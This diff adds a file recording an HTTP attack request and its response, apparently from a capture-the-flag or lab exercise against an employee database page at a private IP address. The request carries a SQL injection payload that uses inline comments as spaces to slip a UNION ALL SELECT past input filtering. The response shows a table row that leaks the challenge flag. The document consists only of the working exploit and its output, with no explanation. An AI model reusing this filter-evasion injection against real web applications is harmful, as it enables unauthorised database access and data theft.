@@ -1,0 +1,79 @@
+Attack Packet:
+
+POST /read.php HTTP/1.1
+Host: 192.168.7.97
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+Origin: http://192.168.7.97
+Connection: close
+Referer: http://192.168.7.97/read.php
+Upgrade-Insecure-Requests: 1
+
+lastname%3d'test'/**/union/**/all/**/select*from/**/location;=""&submit=View%20Results&lastname=p
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Wed, 19 Aug 2020 15:06:08 GMT
+Server: Apache/2.4.32 (Unix)
+X-Powered-By: PHP/5.6.40
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1007
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>Employeee Database Interface</title>
+
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
+
+  <body>
+    <h1>Employee Database Interface</h1>
+  </body>
+</html>
+
+    <h2>Results</h2>
+
+    <table>
+      <thead>
+<tr>
+  <th>First Name</th>
+  <th>Last Name</th>
+  <th>Location ID</th>
+  <th>Age</th>
+  <th>Date</th>
+</tr>
+      </thead>
+      <tbody>
+        <tr>
+<td>2</td>
+<td>ATR{N07 4LL PH1l73R2 R Cr3473D 3KW4l}</td>
+<td>plano</td>
+<td>tx</td>
+<td>us</td>
+      </tr>
+          </tbody>
+  </table>
+  
+<h2>Find employee based on last name</h2>
+
+<form method="post">
+  <label for="lastname">Last Name</label>
+  <input type="text" id="lastname" name="lastname">
+  <input type="submit" name="submit" value="View Results">
+</form>
+
+<a href="index.php">Back to home</a>
+
+</body>
+</html>
